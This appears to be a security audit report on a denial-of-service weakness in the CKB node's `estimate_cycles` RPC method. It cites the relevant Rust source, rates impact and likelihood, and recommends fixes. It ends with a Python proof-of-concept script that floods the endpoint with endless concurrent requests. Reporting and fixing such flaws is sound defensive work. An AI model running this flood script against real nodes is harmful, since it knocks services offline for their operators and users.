### Title
Unbounded CPU Exhaustion via Repeated `estimate_cycles` RPC Calls Without Rate Limiting - (File: `rpc/src/module/chain.rs`)

---

### Summary

The `estimate_cycles` JSON-RPC method executes the full CKB-VM (`ScriptVerifier::verify`) synchronously per call, up to `consensus.max_block_cycles` cycles. The RPC HTTP server has no per-caller rate limiting, no concurrent-request cap, and no per-IP throttling. An unprivileged RPC caller can flood this endpoint with transactions containing scripts crafted to consume maximum cycles, saturating all Tokio executor threads and rendering the node completely unresponsive — a direct analog to the Pontem `signMessage` DoS.

---

### Finding Description

**Entry point — `estimate_cycles` RPC handler:**

`rpc/src/module/chain.rs` lines 2119–2122 define the handler:

```rust
fn estimate_cycles(&self, tx: Transaction) -> Result<EstimateCycles> {
    let tx: packed::Transaction = tx.into();
    CyclesEstimator::new(&self.shared).run(tx)
}
``` [1](#0-0) 

**CPU-intensive synchronous execution — `CyclesEstimator::run`:**

`rpc/src/module/chain.rs` lines 2375–2405 show that each call resolves the transaction and then runs `ScriptVerifier::verify(max_cycles)` — a full RISC-V VM execution — synchronously, with `max_cycles = consensus.max_block_cycles` (3.5 billion cycles on mainnet):

```rust
pub(crate) fn run(&self, tx: packed::Transaction) -> Result<EstimateCycles> {
    ...
    ScriptVerifier::new(Arc::new(resolved), snapshot.as_data_loader(), consensus, Arc::new(tx_env))
        .verify(max_cycles)
    ...
}
``` [2](#0-1) 

**No rate limiting on the RPC server:**

`rpc/src/server.rs` lines 119–129 show the axum router has only a `CorsLayer` and a 30-second `TimeoutLayer` — no per-IP rate limiting, no concurrent-request cap, no per-caller throttling:

```rust
let app = Router::new()
    ...
    .layer(CorsLayer::permissive())
    .layer(TimeoutLayer::with_status_code(
        StatusCode::REQUEST_TIMEOUT,
        Duration::from_secs(30),
    ))
    .layer(Extension(stream_config));
``` [3](#0-2) 

**Synchronous blocking in async context:**

The `estimate_cycles` trait method is declared as a synchronous `fn` (not `async fn`):

```rust
#[rpc(name = "estimate_cycles")]
fn estimate_cycles(&self, tx: Transaction) -> Result<EstimateCycles>;
``` [4](#0-3) 

When `handle_jsonrpc` dispatches this via `io.handle_call(call, T::default()).await`, the synchronous VM execution blocks the Tokio executor thread for the full duration of the script run. With N concurrent attacker connections each submitting a max-cycle transaction, all N Tokio worker threads are blocked, starving every other async task — including block relay, P2P message handling, and all other RPC calls. [5](#0-4) 

**The `estimate_cycles` method is in the Chain module**, which is enabled by default in every CKB node configuration: [6](#0-5) 

**No deduplication guard:** Unlike `send_transaction`, which checks for duplicates in the pool, `estimate_cycles` has no such guard — every call unconditionally runs the VM from scratch.

---

### Impact Explanation

An attacker who can reach the RPC port (default `127.0.0.1:8114`, but commonly exposed to application backends) can:

1. Craft a transaction whose lock/type script loops for exactly `max_block_cycles` cycles.
2. Fire N concurrent HTTP POST requests to `estimate_cycles` (where N ≥ Tokio worker thread count, typically equal to CPU core count).
3. All Tokio executor threads are blocked for up to 30 seconds per wave.
4. The node becomes completely unresponsive: no block relay, no P2P message processing, no other RPC responses.
5. Repeat indefinitely to sustain the outage.

The 30-second `TimeoutLayer` fires at the HTTP layer, but because the VM runs synchronously on the executor thread, the thread remains blocked until the VM completes or the future is dropped — the timeout cannot preempt a blocking CPU computation.

**Impact: 5/5** — Full node DoS; all services (RPC, P2P relay, block processing) are starved.

---

### Likelihood Explanation

- `estimate_cycles` is in the default-enabled Chain module; no special configuration is required.
- The attack requires only HTTP POST access to the RPC port — no keys, no privileged role, no on-chain funds.
- Crafting a max-cycle script is trivial (an infinite loop capped by the cycle limit).
- The attack is repeatable and requires no state.
- Nodes that expose RPC to application backends (a common production pattern) are directly reachable.

**Likelihood: 4/5** — Requires RPC port reachability, which is common but not universal.

---

### Recommendation

1. **Add per-IP or global rate limiting** on the `estimate_cycles` endpoint using a middleware layer (e.g., `tower_governor` or a custom `tower::Service` rate limiter) before the axum router dispatches to the handler.
2. **Run the VM in a `spawn_blocking` task** so that blocking CPU work does not starve the Tokio async executor. This also allows the `TimeoutLayer` to actually cancel the future and reclaim the thread.
3. **Cap concurrent `estimate_cycles` calls** with a semaphore (e.g., `tokio::sync::Semaphore`) to bound the number of simultaneous VM executions.
4. **Consider a lower per-call cycle cap** for `estimate_cycles` (e.g., a fraction of `max_block_cycles`) to bound worst-case execution time per call.

---

### Proof of Concept

```python
import asyncio, aiohttp, json

# Craft a transaction whose lock script loops for max_block_cycles.
# Use a pre-deployed always-loop script or the always-success script
# with a witness that triggers a long computation.
MAX_CYCLE_TX = {
    "cell_deps": [{"dep_type": "code", "out_point": {"index": "0x0", "tx_hash": "<loop_script_tx_hash>"}}],
    "header_deps": [],
    "inputs": [{"previous_output": {"index": "0x0", "tx_hash": "<any_live_cell>"}, "since": "0x0"}],
    "outputs": [{"capacity": "0x2540be400", "lock": {"code_hash": "<loop_script_hash>", "hash_type": "data", "args": "0x"}, "type": None}],
    "outputs_data": ["0x"],
    "version": "0x0",
    "witnesses": []
}

async def flood(session, url):
    payload = {"id": 1, "jsonrpc": "2.0", "method": "estimate_cycles", "params": [MAX_CYCLE_TX]}
    while True:
        try:
            await session.post(url, json=payload)
        except Exception:
            pass

async def main():
    url = "http://127.0.0.1:8114"
    # Fire as many concurrent requests as there are CPU cores (e.g., 8)
    async with aiohttp.ClientSession() as session:
        await asyncio.gather(*[flood(session, url) for _ in range(32)])

asyncio.run(main())
```

After launching this script, all other RPC calls (e.g., `get_tip_block_number`) will time out, and the node's P2P relay will stall, confirming full executor thread exhaustion.

### Citations

**File:** rpc/src/module/chain.rs (L1529-1530)
```rust
    #[rpc(name = "estimate_cycles")]
    fn estimate_cycles(&self, tx: Transaction) -> Result<EstimateCycles>;
```

**File:** rpc/src/module/chain.rs (L2119-2122)
```rust
    fn estimate_cycles(&self, tx: Transaction) -> Result<EstimateCycles> {
        let tx: packed::Transaction = tx.into();
        CyclesEstimator::new(&self.shared).run(tx)
    }
```

**File:** rpc/src/module/chain.rs (L2375-2405)
```rust
    pub(crate) fn run(&self, tx: packed::Transaction) -> Result<EstimateCycles> {
        let snapshot = self.shared.cloned_snapshot();
        let consensus = snapshot.cloned_consensus();
        match resolve_transaction(tx.into_view(), &mut HashSet::new(), self, self) {
            Ok(resolved) => {
                let max_cycles = consensus.max_block_cycles;
                let tip_header = snapshot.tip_header();
                let tx_env = TxVerifyEnv::new_submit(tip_header);
                match ScriptVerifier::new(
                    Arc::new(resolved),
                    snapshot.as_data_loader(),
                    consensus,
                    Arc::new(tx_env),
                )
                .verify(max_cycles)
                {
                    Ok(cycles) => Ok(EstimateCycles {
                        cycles: cycles.into(),
                    }),
                    Err(err) => Err(RPCError::custom_with_error(
                        RPCError::TransactionFailedToVerify,
                        err,
                    )),
                }
            }
            Err(err) => Err(RPCError::custom_with_error(
                RPCError::TransactionFailedToResolve,
                err,
            )),
        }
    }
```

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** rpc/src/server.rs (L256-270)
```rust
        Ok(request) => match request {
            Request::Single(call) => {
                let result = io.handle_call(call, T::default()).await;

                if let Some(response) = result {
                    serde_json::to_string(&response)
                        .map(|json| {
                            (
                                [(axum::http::header::CONTENT_TYPE, "application/json")],
                                json,
                            )
                                .into_response()
                        })
                        .unwrap_or_else(|_| StatusCode::INTERNAL_SERVER_ERROR.into_response())
                } else {
```

**File:** util/app-config/src/configs/rpc.rs (L7-21)
```rust
pub enum Module {
    Net,
    Chain,
    Miner,
    Pool,
    Experiment,
    Stats,
    IntegrationTest,
    Alert,
    Subscription,
    Debug,
    Indexer,
    RichIndexer,
    Terminal,
}
```
